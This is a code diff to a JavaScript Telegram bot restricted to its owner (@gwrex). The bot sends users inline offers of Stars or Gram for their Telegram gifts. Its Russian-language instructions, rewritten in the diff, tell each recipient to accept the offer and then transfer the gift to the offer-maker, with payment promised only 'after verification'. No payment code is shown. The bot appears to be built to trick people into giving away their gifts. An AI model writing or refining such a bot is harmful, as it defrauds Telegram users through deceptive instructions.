@@ -42,7 +42,7 @@ export default {
           const denyText = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
           await callApi("sendMessage", { chat_id: chatId, text: denyText, parse_mode: "HTML" }, BOT_TOKEN);
         } else {
-          const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. Передача подарка возможна только после проверки условий сделки\n4. После подтверждения передачи и оплаты система обновляет статус\n5. Сделка считается завершённой после проверки передачи и оплаты\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+          const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
           
           const startMarkup = {
             inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
@@ -90,7 +90,6 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        // ИСПРАВЛЕНИЕ: Приводим ник к нижнему регистру для корректной ссылки!
         const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
         const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
@@ -103,8 +102,7 @@ export default {
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              // Зашиваем ник в нижнем регистре
-              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}` }],
+              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}` }],
               [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
             ]
           }
@@ -120,7 +118,8 @@ export default {
         if (cq.data === "how_to_accept") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
-          const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Откройте Профиль → Подарки в Telegram\n\n<b>Шаг 4.</b> Выберите подарок из списка своих подарков\n\n<b>Шаг 5.</b> Нажмите кнопку «Передать» в меню действий с подарком\n\n<b>Шаг 6.</b> Передавайте подарок только после проверки получателя и условий расчёта\n\n<b>Шаг 7.</b> Подтвердите передачу подарка\n\n<b>Шаг 8.</b> Дождитесь проверки передачи и оплаты\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка и расчёта.`;
+          // ОБНОВЛЕННАЯ ИНСТРУКЦИЯ
+          const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Нажмите кнопку «🎁 Передать подарок» в сообщении от бота\n\n<b>Шаг 4.</b> Откроется страница подарка — нажмите там кнопку «Передать»\n\n<b>Шаг 5.</b> Выберите продавца из списка и подтвердите передачу\n\n<b>Шаг 6.</b> Дождитесь проверки передачи и оплаты\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка и расчёта.`;
 
           const backMarkup = {
             inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]]
@@ -128,15 +127,13 @@ export default {
 
           try {
             await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN);
-          } catch (e) {
-            console.error(e);
-          }
+          } catch (e) { console.error(e); }
         }
 
         if (cq.data === "back_to_start") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
-          const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. Передача подарка возможна только после проверки условий сделки\n4. После подтверждения передачи и оплаты система обновляет статус\n5. Сделка считается завершённой после проверки передачи и оплаты\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+          const startText = `⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
 
           const startMarkup = {
             inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
@@ -144,9 +141,7 @@ export default {
 
           try {
             await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
-          } catch (e) {
-            console.error(e);
-          }
+          } catch (e) { console.error(e); }
         }
 
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
@@ -156,14 +151,12 @@ export default {
           const amount = dataParts[1] || "0";
           const currencyType = dataParts[2] || "stars";
           const sellerUsername = dataParts[3] || "gwrex"; 
+          const giftLink = dataParts[4] || ""; 
           const displayCurrency = currencyType === "gram" ? "💎 Gram" : "⭐ Stars";
 
           const buyer = cq.from;
           let buyerName = buyer.first_name || "";
           if (buyer.last_name) buyerName += " " + buyer.last_name;
-
-          // Теперь ссылка ВСЕГДА будет маленькими буквами (например, https://t.me/gwrex)
-          const sellerLink = "https://t.me/" + sellerUsername.toLowerCase();
 
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
@@ -171,13 +164,16 @@ export default {
           if (action === "acc") {
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
-              text: `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы перейти к продавцу`, 
+              text: `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, 
               show_alert: true 
             }, BOT_TOKEN);
             
-            newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу.`;
+            newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
+            
+            let finalUrl = giftLink ? giftLink : ("https://t.me/" + sellerUsername);
+            
             newMarkup = { 
-              inline_keyboard: [[{ text: "🎁 Передать подарок", url: sellerLink }]] 
+              inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] 
             };
           } else {
             await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
